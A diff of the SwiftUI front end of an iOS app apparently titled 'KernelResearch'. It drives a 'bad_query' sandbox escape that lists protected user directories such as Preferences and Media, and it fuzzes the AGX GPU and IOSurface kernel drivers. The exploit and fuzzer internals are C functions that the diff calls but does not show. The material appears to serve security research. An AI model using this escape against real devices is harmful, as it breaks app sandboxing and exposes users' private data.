@@ -1,6 +1,6 @@
 import SwiftUI
 
-// MARK: — Swift wrapper around C fuzzer callback
+// MARK: — Log model
 
 class FuzzLog: ObservableObject {
     @Published var lines: [String] = []
@@ -11,12 +11,20 @@ class FuzzLog: ObservableObject {
             if self.lines.count > 500 { self.lines.removeLast() }
         }
     }
-    func clear() {
-        DispatchQueue.main.async { self.lines.removeAll() }
+    func clear() { DispatchQueue.main.async { self.lines.removeAll() } }
+}
+
+// Converts a C fixed-size char array (bridged as tuple) to Swift String.
+// char detail[256] becomes a 256-element tuple in Swift — String(cString:)
+// needs a pointer, not a tuple, so we use withUnsafeBytes.
+private func cArrayToString<T>(_ tuple: T) -> String {
+    withUnsafeBytes(of: tuple) { rawPtr in
+        guard let base = rawPtr.baseAddress else { return "" }
+        return String(cString: base.assumingMemoryBound(to: CChar.self))
     }
 }
 
-// Bridge: C callback → Swift closure stored in a box
+// Retained box for passing Swift closures through C void* context pointer
 private class CallbackBox {
     let log: FuzzLog
     init(_ l: FuzzLog) { log = l }
@@ -31,19 +39,17 @@ struct ContentView: View {
     var body: some View {
         NavigationStack {
             VStack(spacing: 0) {
-                // Action buttons
                 ScrollView(.horizontal, showsIndicators: false) {
                     HStack(spacing: 10) {
-                        ActionBtn("bad_query\nEscape", color: .orange) { runBadQuery() }
-                        ActionBtn("Enumerate\nServices",  color: .blue)   { runEnumerate() }
-                        ActionBtn("Fuzz AGX\nDriver",    color: .red)    { runFuzzAGX() }
-                        ActionBtn("Fuzz\nIOSurface",     color: .purple) { runFuzzIOSurface() }
-                        ActionBtn("Clear\nLog",          color: .gray)   { log.clear() }
+                        ActionBtn("bad_query\nEscape",  color: .orange) { runBadQuery() }
+                        ActionBtn("Enumerate\nServices", color: .blue)  { runEnumerate() }
+                        ActionBtn("Fuzz AGX\nDriver",   color: .red)   { runFuzzAGX() }
+                        ActionBtn("Fuzz\nIOSurface",    color: .purple) { runFuzzIOSurface() }
+                        ActionBtn("Clear\nLog",         color: .gray)  { log.clear() }
                     }
                     .padding()
                 }
 
-                // Log view
                 ScrollView {
                     LazyVStack(alignment: .leading, spacing: 2) {
                         ForEach(log.lines.indices, id: \.self) { i in
@@ -58,9 +64,7 @@ struct ContentView: View {
                 .background(Color(white: 0.05))
 
                 if running {
-                    ProgressView("Fuzzing...")
-                        .padding(6)
-                        .foregroundColor(.yellow)
+                    ProgressView("Fuzzing…").padding(6).foregroundColor(.yellow)
                 }
             }
             .navigationTitle("KernelResearch")
@@ -78,65 +82,29 @@ struct ContentView: View {
         log.append("── bad_query ─────────────────────────────")
 
         DispatchQueue.global(qos: .userInitiated).async {
-            // Test 1: system path traversal (no app group needed)
-            // Try to get access to /var/mobile/Library/Caches
-            let targetPath = "/var/mobile/Library/Caches"
-            let handle = bad_query(
-                UnsafeMutablePointer<CChar>(mutating: (targetPath as NSString).utf8String),
-                false,   // create = false
-                nil,     // group_identifier = nil → MCMSharedSystemDataContainer
-                false    // is_group = false
-            )
-
-            if handle >= 0 {
-                log.append("✓ bad_query handle=\(handle)  path=\(targetPath)")
-                log.append("  Sandbox extension consumed — filesystem access granted")
-
-                // Try to list the directory now that we have the extension
-                var isDir: ObjCBool = false
-                let exists = FileManager.default.fileExists(atPath: targetPath, isDirectory: &isDir)
-                log.append("  FileManager.fileExists(\(targetPath)) = \(exists) isDir=\(isDir.boolValue)")
-
-                if exists && isDir.boolValue {
-                    do {
-                        let items = try FileManager.default.contentsOfDirectory(atPath: targetPath)
-                        log.append("  Directory entries: \(items.count)")
-                        for item in items.prefix(10) {
-                            log.append("    \(item)")
-                        }
-                    } catch {
-                        log.append("  contentsOfDirectory error: \(error)")
-                    }
-                }
-
-                bad_query_release(handle)
-            } else {
-                log.append("✗ bad_query FAILED for \(targetPath)")
-                log.append("  Possible: iOS version mismatch, containermanagerd patched")
-            }
-
-            // Test 2: app container traversal — access another app's Documents
-            // Try a few well-known system paths
             let paths = [
+                "/var/mobile/Library/Caches",
                 "/var/mobile/Library/Preferences",
                 "/var/mobile/Media",
-                "/private/var/db",
             ]
             for p in paths {
-                let h2 = bad_query(
+                let handle = bad_query(
                     UnsafeMutablePointer<CChar>(mutating: (p as NSString).utf8String),
-                    false, nil, false
-                )
-                if h2 >= 0 {
+                    false, nil, false)
+                if handle >= 0 {
                     var isDir: ObjCBool = false
                     let ok = FileManager.default.fileExists(atPath: p, isDirectory: &isDir)
-                    log.append("✓ \(p) → handle=\(h2) accessible=\(ok)")
-                    bad_query_release(h2)
+                    self.log.append("✓ \(p) → handle=\(handle) accessible=\(ok)")
+                    if ok && isDir.boolValue {
+                        if let items = try? FileManager.default.contentsOfDirectory(atPath: p) {
+                            for item in items.prefix(6) { self.log.append("    \(item)") }
+                        }
+                    }
+                    bad_query_release(handle)
                 } else {
-                    log.append("✗ \(p) → failed")
+                    self.log.append("✗ \(p) → failed")
                 }
             }
-
             DispatchQueue.main.async { self.running = false }
         }
     }
@@ -149,15 +117,14 @@ struct ContentView: View {
         DispatchQueue.global(qos: .userInitiated).async {
             var outPtr: UnsafeMutablePointer<CChar>? = nil
             let count = iokit_enumerate_services(&outPtr)
-
             if let ptr = outPtr {
-                let str = String(cString: ptr)
+                String(cString: ptr)
+                    .components(separatedBy: "\n")
+                    .filter { !$0.isEmpty }
+                    .forEach { self.log.append($0) }
                 free(ptr)
-                for line in str.components(separatedBy: "\n") where !line.isEmpty {
-                    log.append(line)
-                }
             }
-            log.append("── Total opened: \(count) service(s)")
+            self.log.append("── Total opened: \(count)")
             DispatchQueue.main.async { self.running = false }
         }
     }
@@ -166,34 +133,31 @@ struct ContentView: View {
         guard !running else { return }
         running = true
         log.append("── Fuzzing AGXMetalA16 ────────────────────")
-        log.append("  selectors 0..255 × 16 rounds per selector")
 
         DispatchQueue.global(qos: .userInitiated).async {
-            // Use a retained box so the C callback closure captures log safely
-            let box = CallbackBox(log)
+            let box = CallbackBox(self.log)
             let boxPtr = Unmanaged.passRetained(box).toOpaque()
 
+            // C fixed-size char arrays bridge as tuples — use cArrayToString
             let hits = iokit_fuzz_agx({ entryPtr, ctx in
-                guard let entry = entryPtr?.pointee,
-                      let ctx = ctx else { return 0 }
+                guard let ep = entryPtr, let ctx = ctx else { return 0 }
                 let b = Unmanaged<CallbackBox>.fromOpaque(ctx).takeUnretainedValue()
-                let line: String
+                let entry = ep.pointee
+                let detail = cArrayToString(entry.detail)
                 switch entry.result {
-                case FUZZ_RESULT_OK:
-                    line = "  AGX OK    \(String(cString: entry.detail))"
                 case FUZZ_RESULT_PANIC:
-                    line = "*** AGX CRASH  sel=\(entry.selector) — PORT DIED"
+                    b.log.append("*** AGX CRASH  sel=\(entry.selector) — PORT DIED")
+                case FUZZ_RESULT_OK:
+                    b.log.append("  AGX OK    \(detail)")
                 case FUZZ_RESULT_ERROR:
-                    line = "  AGX ERR   \(String(cString: entry.detail))"
-                default:
-                    line = "  AGX ???   \(String(cString: entry.detail))"
+                    b.log.append("  AGX ERR   \(detail)")
+                default: break
                 }
-                b.log.append(line)
                 return 0
             }, boxPtr)
 
             Unmanaged<CallbackBox>.fromOpaque(boxPtr).release()
-            log.append("── AGX fuzz done. Interesting hits: \(hits)")
+            self.log.append("── AGX done. Interesting hits: \(hits)")
             DispatchQueue.main.async { self.running = false }
         }
     }
@@ -204,24 +168,26 @@ struct ContentView: View {
         log.append("── Fuzzing IOSurfaceRoot ──────────────────")
 
         DispatchQueue.global(qos: .userInitiated).async {
-            let box = CallbackBox(log)
+            let box = CallbackBox(self.log)
             let boxPtr = Unmanaged.passRetained(box).toOpaque()
 
             let hits = iokit_fuzz_iosurface({ entryPtr, ctx in
-                guard let entry = entryPtr?.pointee, let ctx = ctx else { return 0 }
+                guard let ep = entryPtr, let ctx = ctx else { return 0 }
                 let b = Unmanaged<CallbackBox>.fromOpaque(ctx).takeUnretainedValue()
+                let entry = ep.pointee
+                let detail = cArrayToString(entry.detail)
                 switch entry.result {
                 case FUZZ_RESULT_PANIC:
                     b.log.append("*** IOSurface CRASH  sel=\(entry.selector) — PORT DIED")
                 case FUZZ_RESULT_OK:
-                    b.log.append("  Surface OK  \(String(cString: entry.detail))")
+                    b.log.append("  Surface OK  \(detail)")
                 default: break
                 }
                 return 0
             }, boxPtr)
 
             Unmanaged<CallbackBox>.fromOpaque(boxPtr).release()
-            log.append("── IOSurface fuzz done. Interesting hits: \(hits)")
+            self.log.append("── IOSurface done. Hits: \(hits)")
             DispatchQueue.main.async { self.running = false }
         }
     }
@@ -229,36 +195,28 @@ struct ContentView: View {
     // MARK: — Helpers
 
     private func lineColor(_ line: String) -> Color {
-        if line.contains("***")         { return .red }
-        if line.contains("CRASH")       { return .red }
-        if line.contains("FAIL")        { return .orange }
-        if line.contains("✓")           { return .green }
-        if line.contains("✗")           { return .red }
-        if line.contains("OK")          { return Color(red: 0.4, green: 1, blue: 0.4) }
-        if line.hasPrefix("──")         { return .yellow }
+        if line.contains("***") || line.contains("CRASH") { return .red }
+        if line.contains("FAIL") || line.contains("✗")   { return .orange }
+        if line.contains("✓") || line.contains(" OK ")   { return Color(red: 0.4, green: 1, blue: 0.4) }
+        if line.hasPrefix("──")                           { return .yellow }
         return .gray
     }
 }
 
-// MARK: — Action button component
+// MARK: — Button component
 
 struct ActionBtn: View {
-    let label: String
-    let color: Color
-    let action: () -> Void
-
-    init(_ label: String, color: Color, action: @escaping () -> Void) {
-        self.label = label; self.color = color; self.action = action
+    let label: String; let color: Color; let action: () -> Void
+    init(_ l: String, color: Color, action: @escaping () -> Void) {
+        label = l; self.color = color; self.action = action
     }
-
     var body: some View {
         Button(action: action) {
             Text(label)
                 .font(.system(size: 12, weight: .semibold, design: .monospaced))
                 .multilineTextAlignment(.center)
                 .foregroundColor(.white)
-                .padding(.vertical, 8)
-                .padding(.horizontal, 14)
+                .padding(.vertical, 8).padding(.horizontal, 14)
                 .background(color.opacity(0.85))
                 .cornerRadius(8)
         }
